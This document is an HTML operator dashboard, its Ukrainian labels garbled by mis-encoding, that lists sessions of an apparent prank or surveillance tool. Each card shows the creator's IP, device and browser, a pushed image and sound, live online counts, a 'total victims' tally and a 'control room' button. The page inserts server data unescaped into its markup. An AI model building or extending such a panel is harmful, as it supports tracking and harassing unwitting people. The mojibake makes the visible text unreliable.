<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Watch All Sessions</title>
    <style>
        body { background: #0f0f0f; color: #00ff99; font-family: 'Courier New', monospace; padding: 20px; margin: 0; }
        .container { max-width: 900px; margin: 0 auto; }
        h1 { text-align: center; color: #00ff99; text-shadow: 0 0 10px #00ff99; }
        .sessions-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 15px; margin-top: 20px; }
        .session-card { background: #1a1a1a; border: 1px solid #333; border-radius: 10px; padding: 15px; position: relative; transition: transform 0.2s; }
        .session-card:hover { transform: translateY(-5px); box-shadow: 0 0 15px rgba(0, 255, 153, 0.3); }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
        .room-id { font-size: 12px; color: #888; }
        .delete-btn { background: #ff0055; color: white; border: none; padding: 6px 10px; border-radius: 4px; cursor: pointer; font-size: 12px; }
        .delete-btn:hover { background: #ff3366; }
        .preview-img { width: 100%; height: 200px; object-fit: cover; border-radius: 8px; background: #222; margin: 10px 0; }
        .sound-preview { background: #222; padding: 10px; border-radius: 6px; font-size: 12px; word-break: break-all; color: #aaa; }
        .stats { display: flex; justify-content: space-between; margin-top: 10px; font-size: 13px; }
        .online { color: #00ff99; font-weight: bold; }
        .last-active { color: #ffcc00; font-size: 12px; margin-top: 8px; }
        .control-btn { width: 100%; padding: 12px; background: #00ccff; color: black; border: none; border-radius: 6px; font-weight: bold; margin-top: 10px; cursor: pointer; }
        .no-sessions { text-align: center; color: #666; font-size: 18px; margin: 50px; }
        .refresh-info { text-align: center; color: #555; font-size: 12px; margin: 20px 0; }
        .creator-info { background:#222; padding:8px; border-radius:6px; margin:10px 0; font-size:12px; color:#aaa; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üëÅÔ∏è WATCH ALL SESSIONS</h1>
        <div class="refresh-info">–û–Ω–æ–≤–ª—é—î—Ç—å—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ –∫–æ–∂–Ω—ñ 30 —Å–µ–∫—É–Ω–¥</div>
        <div id="sessions-container" class="sessions-grid">
            <div class="no-sessions">–ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Å–µ—Å—ñ–π...</div>
        </div>
    </div>

    <script>
        const container = document.getElementById('sessions-container');

        async function loadAllSessions() {
            try {
                const res = await fetch('/sessions');
                if (!res.ok) throw new Error();
                const sessions = await res.json();

                if (sessions.length === 0) {
                    container.innerHTML = '<div class="no-sessions">–ù–µ–º–∞—î —Å—Ç–≤–æ—Ä–µ–Ω–∏—Ö —Å–µ—Å—ñ–π</div>';
                    return;
                }

                container.innerHTML = '';

                sessions.forEach(s => {
                    const lastActiveDate = s.lastActiveAt ? new Date(s.lastActiveAt).toLocaleString('uk-UA') : '–ù–µ–≤—ñ–¥–æ–º–æ';
                    const isActiveNow = s.onlineCount > 0;

                    const card = document.createElement('div');
                    card.className = 'session-card';

                    card.innerHTML = `
                        <div class="header">
                            <div>
                                <div style="font-size:14px; font-weight:bold;">–°—Ç–≤–æ—Ä–µ–Ω–æ: ${s.createdAt}</div>
                                <div class="room-id">ID: ...${s.id.slice(-8)}</div>
                            </div>
                            <button class="delete-btn" onclick="deleteSession('${s.id}', this)">–í–∏–¥–∞–ª–∏—Ç–∏</button>
                        </div>

                        <div class="creator-info">
                            <strong>üë§ –°—Ç–≤–æ—Ä–∏–≤:</strong><br>
                            ${s.creator.device}<br>
                            IP: ${s.creator.ip}<br>
                            <small style="color:#666;">${s.creator.userAgent || '–ù–µ–≤—ñ–¥–æ–º–∏–π –±—Ä–∞—É–∑–µ—Ä'}</small>
                        </div>

                        ${s.image ? `<img src="${s.image}" class="preview-img" onerror="this.src='https://via.placeholder.com/300x200/222/666?text=–ü–æ–º–∏–ª–∫–∞+–∑–æ–±—Ä–∞–∂–µ–Ω–Ω—è'; this.onerror=null;">` : 
                         `<div class="preview-img" style="display:flex;align-items:center;justify-content:center;color:#666;font-size:14px;">–ù–µ–º–∞—î –∫–∞—Ä—Ç–∏–Ω–∫–∏</div>`}

                        <div class="sound-preview">
                            üîä –ó–≤—É–∫: ${s.sound ? s.sound.split('/').pop() : '–ù–µ–º–∞—î'}<br>
                            <small>${s.sound || '‚Äî'}</small>
                        </div>

                        <div class="stats">
                            <div>${isActiveNow ? `<span class="online">‚óè ${s.onlineCount} –æ–Ω–ª–∞–π–Ω</span>` : '–û—Ñ—Ñ–ª–∞–π–Ω'}</div>
                            <div>–í—Å—å–æ–≥–æ –∂–µ—Ä—Ç–≤: <strong>${s.totalVictims}</strong></div>
                        </div>

                        <div class="last-active">
                            –û—Å—Ç–∞–Ω–Ω—è –∞–∫—Ç–∏–≤–Ω—ñ—Å—Ç—å: ${isActiveNow ? '<strong style="color:#00ff99;">–ó–ê–†–ê–ó</strong>' : lastActiveDate}
                        </div>

                        <button class="control-btn" onclick="openControl('${s.id}')">
                            –ö–ï–†–£–í–ê–¢–ò –ö–Ü–ú–ù–ê–¢–û–Æ
                        </button>
                    `;

                    container.appendChild(card);
                });
            } catch (err) {
                container.innerHTML = '<div class="no-sessions">–ü–æ–º–∏–ª–∫–∞ –∑\'—î–¥–Ω–∞–Ω–Ω—è –∑ —Å–µ—Ä–≤–µ—Ä–æ–º</div>';
            }
        }

        function openControl(id) {
            window.open(`/admin.html#${id}`, '_blank');
        }

        async function deleteSession(id, btn) {
            if (!confirm('–í–∏–¥–∞–ª–∏—Ç–∏ —Ü—é —Å–µ—Å—ñ—é –Ω–∞–∑–∞–≤–∂–¥–∏?')) return;
            btn.disabled = true;
            btn.innerText = '–í–∏–¥–∞–ª—è—î—Ç—å—Å—è...';

            try {
                const res = await fetch(`/session/${id}`, { method: 'DELETE' });
                if (res.ok) loadAllSessions();
                else alert('–ü–æ–º–∏–ª–∫–∞ –≤–∏–¥–∞–ª–µ–Ω–Ω—è');
            } catch (e) {
                alert('–ü–æ–º–∏–ª–∫–∞ –º–µ—Ä–µ–∂—ñ');
            } finally {
                btn.disabled = false;
                btn.innerText = '–í–∏–¥–∞–ª–∏—Ç–∏';
            }
        }

        loadAllSessions();
        setInterval(loadAllSessions, 30000);
    </script>
</body>
</html>
